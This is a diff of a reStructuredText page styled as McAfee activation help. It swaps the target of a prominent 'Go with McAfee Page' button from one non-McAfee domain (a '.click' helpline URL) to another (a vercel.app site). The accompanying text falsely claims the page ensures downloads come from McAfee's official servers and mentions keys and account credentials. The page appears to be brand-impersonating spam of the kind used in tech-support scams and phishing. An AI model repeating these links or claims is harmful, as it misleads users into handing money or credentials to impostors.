@@ -6,7 +6,7 @@ If you’ve already purchased a McAfee antivirus subscription and need to activa
 .. raw:: html
 
    <div style="text-align:center;">
-       <a href="https://mcafeedesk.securebase.click/helpline/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with McAfee Page</a>
+       <a href="https://mymcafee.vercel.app/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with McAfee Page</a>
    </div>
 
 Using **www.mcafee.com/activate download & install** ensures your setup files are downloaded directly from McAfee’s official servers, protecting you from fake or infected software versions. With your valid key and account credentials, it only takes a few minutes to **install McAfee already purchased** and keep your computer safe from viruses, ransomware, and other online threats.  
